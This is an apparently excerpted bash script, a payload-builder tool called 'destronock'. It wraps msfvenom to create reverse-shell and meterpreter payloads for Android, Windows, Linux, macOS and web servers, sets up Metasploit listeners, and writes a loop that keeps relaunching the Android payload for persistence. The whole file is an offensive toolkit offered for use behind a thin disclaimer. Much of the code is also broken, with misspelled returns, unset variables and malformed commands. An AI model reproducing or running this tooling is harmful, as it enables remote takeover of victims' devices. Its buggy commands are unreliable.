...
# PROGRAM BY SUBHAYAN GOSWAMI
# DONT TRY TO EDIT THIS CODE
# THIS TOOL IS DESIGN TO CREATE PAYLOAD
# THIS CODE IS NOT INTENT TO HURM ANYONE IF YOU DO, THATS YOUR OWN RISK..
...
echo " "
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R -o /sdcard/destronock/$name.apk > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronock | cat -n 
echo ""
...
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf /sdcard/destronock/$name.elf > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronock | cat -n 
...
echo "GIVE ME FEW SECOND"  
echo " "
msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /sdcard/destronock/$name.exe > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronock | cat -n 
...
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > /sdcard/destronock/$name.macho > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronock | cat -n 
...
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > /sdcard/destronock/$name.php > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronock | cat -n 
...
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f asp > /sdcard/destronock/$name.asp > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronock | cat -n 
...
echo "GIVE ME FEW SECOND"  
echo " "
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > /sdcard/destronock/$name.jsp > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronock | cat -n 
...
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f war > /sdcard/destronock/$name.war > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronock | cat -n 
...
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p cmd/unix/reverse_python LHOST=$lhost LPORT=$lport -f raw > /sdcard/destronock/$name.py > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronock | cat -n 
...
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport -f raw > /sdcard/destronock/$name.sh > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronock | cat -n 
...
echo "GIVE ME FEW SECOND"  
echo " "
msfvenom -p cmd/unix/reverse_perl LHOST=$lhost LPORT=$lport -f raw > /sdcard/destronock/$name.pl > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronock | cat -n 
...
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f < /sdcard/destronock/ > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronock | cat -n 
...
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f < /sdcard/destronock/$name.sh > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronock | cat -n 
...
echo "GIVE ME FEW SECOND"  
echo " "
msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f < /sdcard/destronock/$name.pl > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronock | cat -n 
...
returu
 ...
 function androidlisnr(){
            touch ~/sdcard/destronock/meterpreter_droid.rc
            echo use exploit/multi/handler > ~/sdcard/destronock/meterpreter_droid.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/sdcard/destronock/meterpreter_droid.rc
            read -p 'LHOST IP: ' lhost
            echo set LHOST $uservar >> ~/sdcard/destronock/meterpreter_droid.rc
            read -p 'lHOST PORT: ' lport
            echo set LPORT $uservar >> ~/sdcard/destronock/meterpreter_droid.rc
            echo set ExitOnSession false >> ~/sdcard/destronock/meterpreter_droid.rc
            echo exploit -j -z >> ~/sdcard/destronock/meterpreter_droid.rc
            cat ~/sdcard/destronock/meterpreter_droid.rc
            xterm -e msfconsole -r ~/sdcard/destronock/meterpreter_droid.rc &
            echo "ENTER TO CONTINUE"
            read anl
            retru
            }
function linuxlisnr(){
            touch ~/sdcard/destronock/meterpreter_linux.rc
            echo use exploit/multi/handler > ~/sdcard/destronock/meterpreter_linux.rc
            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/sdcard/destronock/meterpreter_linux.rc
            read -p 'LHOST IP: ' lhost
            echo set LHOST $uservar >> ~/sdcard/destronock/meterpreter_linux.rc
            read -p 'lHOST PORT: ' lhost
            echo set LPORT $uservar >> ~/sdcard/destronock/meterpreter_linux.rc
            echo set ExitOnSession false >> ~/sdcard/destronock/meterpreter_linux.rc
            echo exploit -j -z >> ~/sdcard/destronock/meterpreter_linux.rc
            cat ~/sdcard/destronock/meterpreter_linux.rc
            xterm -e msfconsole -r ~/sdcard/destronock/meterpreter_linux.rc &
            echo "ENTER TO CONTINUE"
            read lnsr
            retru
            }
...
function windowslisnr(){
    ...
    function maclisnr(){
            touch ~/sdcard/destronock/meterpreter_mac.rc
            echo use exploit/multi/handler > ~/sdcard/destronock/meterpreter_mac.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/sdcard/destronock/meterpreter_mac.rc
            read -p 'Set LHOST IP: ' lhost
            echo set LHOST $uservar >> ~/sdcard/destronock/meterpreter_mac.rc
            read -p 'Set LPORT: ' lhost
            echo set LPORT $uservar >> ~/sdcard/destronock/meterpreter_mac.rc
            echo set ExitOnSession false >> ~/sdcard/destronock/meterpreter_mac.rc
            echo exploit -j -z >> ~/Desktop/temp/meterpreter_mac.rc
            cat ~/sdcard/destronock/meterpreter_mac.rc
            xterm -e msfconsole -r ~/sdcard/destronock/meterpreter_mac.rc
            echo "ENTER TO CONTINUE"
            read mcl
            retru
            }
...
#==========================================================================================================================================
function andpr(){
            touch ~/sdcard/destronock/android.sh
            echo \#\!/bin/bash >> ~/sdcard/destronock/android.sh
            echo while : >> ~/sdcard/destronock/android.sh
            echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> ~/sdcard/destronock/android.sh
            echo sleep 20 >> ~/sdcard/destronock/android.sh
            echo done >> ~/sdcard/destronock/android.sh
            cat ~/sdcard/destronock/android.sh
